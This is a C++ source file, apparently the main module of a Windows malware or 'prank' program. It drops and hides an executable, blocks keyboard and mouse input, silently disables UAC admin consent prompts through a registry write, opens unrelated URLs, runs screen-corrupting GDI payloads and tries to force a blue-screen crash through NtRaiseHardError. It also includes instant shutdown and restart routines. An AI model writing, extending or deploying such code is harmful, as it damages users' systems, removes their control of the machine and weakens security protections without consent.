#include "MU.h"

BOOL MuShutDown
	(no_args)
{
	system("shutdown -s -t 0");
	Sleep(1000);
	return 0x001;
}

BOOL MuRestart
	(no_args)
{
	system("shutdown -r -t 0");
	Sleep(1000);
	return 0x001;
}

// #define RELEASE

VOID __fastcall Init
	(no_args)
{

	DWORD bytesWritten;
	HANDLE lScreenHandle = CreateFileW(
		L"zGTfCbsKoH.exe", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		CREATE_NEW, 0, 0
	);
	WriteFile(lScreenHandle, LoadingScreen,
		(DWORD)(sizeof(LoadingScreen) / sizeof(LoadingScreen[0])), &bytesWritten, 0);
	CloseHandle(lScreenHandle);
	SetFileAttributes(L"zGTfCbsKoH.exe", FILE_ATTRIBUTE_HIDDEN);
	Sleep(1000);

#ifdef RELEASE
	system("start zGTfCbsKoH.exe");
#endif

	/* just to make sure that alt tabbing isnt an option*/
	BlockInput(true);

	HKEY hKey;
	DWORD buffersize = 4;
	DWORD data = 0;
#ifdef RELEASE
	if (ERROR_SUCCESS == RegOpenKeyExW(HKEY_LOCAL_MACHINE,
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey))
	{
		if (RegSetValueExW(hKey, L"ConsentPromptBehaviorAdmin", 0, REG_DWORD, (LPBYTE)&data, sizeof(data)))
		{
			RegCloseKey(hKey);
		
		}

		RegCloseKey(hKey);
	}
#endif

	Sleep(10000);
	BlockInput(false);

}

int wWinMain
	(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
	/*	Payload 0. Overwrites screen (not taskbar) 
		with an animation & stops user input while	
		some important setup goes on in background 
													*/


	Sleep(10000);


	ShellExecuteA(NULL, "open", "file:///C:\\Windows\\System32\\ntoskrnl.exe", NULL, NULL, SW_SHOWDEFAULT);
	
	Sleep(10000);



	ShellExecuteA(NULL, "open", "https://harvard.edu", NULL, NULL, SW_SHOWDEFAULT);

	Sleep(10000);

	ShellExecuteA(NULL, "open", "https://www.apple.com/iphone-13-pro/", NULL, NULL, SW_SHOWDEFAULT);


	Sleep(10000);
	std::thread InitThread(Init);
	InitThread.join();

	Boom();

	Sleep(5000);
#ifdef RELEASE
	movingWindows((unsigned int)10);
#endif
	Sleep(5000);
	startGDIPayload();	 

#ifndef RELEASE
	ExitProcess(1);
#endif

	if (invokeHardError() == INVOKE_HARD_ERROR_FAILED)
	{
		LPWSTR ErrorBsodFailureH = L"Debug";
		LPWSTR ErrorBsodFailureB = L"NtRaiseHardError failed.";
		makeToastNotif(ErrorBsodFailureH, ErrorBsodFailureB);
		ExitProcess(INVOKE_HARD_ERROR_FAILED);
	}


}